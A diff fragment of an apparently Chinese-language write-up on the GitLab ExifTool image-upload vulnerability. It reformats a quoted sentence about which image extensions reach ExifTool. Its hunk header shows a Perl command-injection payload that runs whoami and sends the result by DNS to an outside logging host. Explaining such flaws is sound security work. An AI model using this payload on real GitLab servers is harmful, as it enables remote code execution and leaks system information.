@@ -36,7 +36,7 @@ qx{ping `whoami`.5pxha.i3ntq7.bnslog.top}
 
 如作者在报告里所说：
 
-- When uploading image files, GitLab Workhorse passes any files with the extensions [jpg|jpeg|tiff](https://gitlab.com/gitlab-org/gitlab/-/blob/v13.10.2-ee/workhorse/internal/upload/exif/exif.go#L104) through to ExifTool to remove any non-whitelisted tags.
+- When uploading image files, GitLab Workhorse passes any files with the **extensions [jpg|jpeg|tiff]** through to ExifTool to remove any non-whitelisted tags.
 - 上传图像文件时，`GitLab Workhorse` 会将任何扩展名为 `jpg|jpeg|tiff` 的文件传递给 `ExifTool`，以删除任何未列入白名单的标签。
 
 ```go
